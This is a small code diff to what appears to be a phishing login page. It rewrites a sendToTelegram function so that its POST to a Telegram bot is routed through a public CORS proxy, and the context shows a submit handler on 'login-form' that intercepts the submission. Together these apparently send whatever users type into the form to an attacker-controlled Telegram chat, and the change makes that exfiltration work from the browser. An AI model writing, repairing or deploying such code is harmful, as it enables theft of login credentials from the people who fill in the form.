@@ -149,17 +149,17 @@
   }
 
   async function sendToTelegram(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'Markdown'
-      })
-    });
-  }
+  const url = 'https://corsproxy.io/?' + encodeURIComponent(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
+  await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: 'Markdown'
+    })
+  });
+}
 
   document.getElementById('login-form').addEventListener('submit', async function (e) {
     e.preventDefault();
